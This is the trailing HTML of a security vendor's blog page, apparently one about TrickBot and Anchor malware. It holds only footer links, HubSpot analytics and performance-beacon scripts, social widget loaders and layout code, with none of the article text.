            <li><a class="youtube" href="https://www.youtube.com/channel/UCOm7AaB0HiNH4Phe66sK0Ew"></a></li>
            <li><a class="linkedin" href="https://www.linkedin.com/company/cybereason"></a></li>
            <li><a class="instagram" href="https://www.instagram.com/cybereason"></a></li>
          </ul>
        </div>
    </div>
  </div>

</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<script>
(function () {
    window.addEventListener('load', function () {
        setTimeout(function () {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/_hcms/perf', true /*async*/);
            xhr.setRequestHeader("Content-type", "application/json");
            xhr.onreadystatechange = function () {
                // do nothing.
            };
            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            function populateNetworkInfo(name, connection, info) {
                if (name in connection) {
                    info[name] = connection[name];
                }
            }
            var networkInfo = {};
            if (connection) {
                ['type', 'effectiveType', 'downlink', 'rtt'].forEach(function(name) {
                    populateNetworkInfo(name, connection, networkInfo);
                });
            }
            var perfData = {
                url: location.href,
                portal: 3354902,
                content: 23309573296,
                group: -1,
                connection: networkInfo,
                timing: performance.timing
            };
            xhr.send(JSON.stringify(perfData));
        }, 3000);  // Execute this 3 seconds after onload.
    });
})();
</script>

<script src="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42507089303/1614944819152/__CR_Web_Platform_2020/JS/animatedModal/animatedModal.min.js"></script>
<script>
if (typeof hsVars !== 'undefined') { hsVars['language'] = 'en'; }
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.27/bundles/project.js"></script>
<script src="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41681847227/1619109182704/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.js"></script>
<script src="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41682410610/1618194602937/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cybereason.com\/blog\/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"]);
_hsq.push(["setPageId", "23309573296"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 23309573296,
    "legacyPageId": "23309573296",
    "contentFolderId": null,
    "contentGroupId": 5272851739,
    "abTestId": null,
    "languageVariantId": 23309573296,
    "languageCode": "en",
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/3354902.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    ticks: 1621734252272,
    page_id: 23309573296,

    content_group_id: 5272851739,
    portal_id: 3354902,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.103/js/index.js"></script>

<script>if ($('[id^="hs_form"]').length > 0) {
  var myInterval = setInterval(
  function() {
    var myFields = document.getElementsByClassName('hs-input');
    if (myFields.length > 0) {
      clearInterval(myInterval);
      for (var i = 0; i < myFields.length; i++) {
        var myField = myFields[i];
		var myTagName = myField.tagName.toLowerCase();
        if (myTagName == 'input' || myTagName == 'textarea') {
          if (myField.placeholder != null) {
            myField.placeholder = myField.placeholder.replace('*', '');
          }
        } else if (myTagName == 'select') {
          myField.options[0].innerHTML = myField.options[0].innerHTML.replace('*', '');
        }
      }
    }
  }, 100);
}
</script>

<div id="fb-root"></div>
 <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&status=0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


    <script>
function sticky_relocate() {
  var window_top = $(window).scrollTop();
  var div_top = $('#sticky-anchor').offset().top;
  if (window_top > div_top) {
    $('#sticky').addClass('stick');
  } else {
    $('#sticky').removeClass('stick');
  }
}

$(function() {
  $(window).scroll(sticky_relocate);
  sticky_relocate();
});
</script>
    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

</body></html>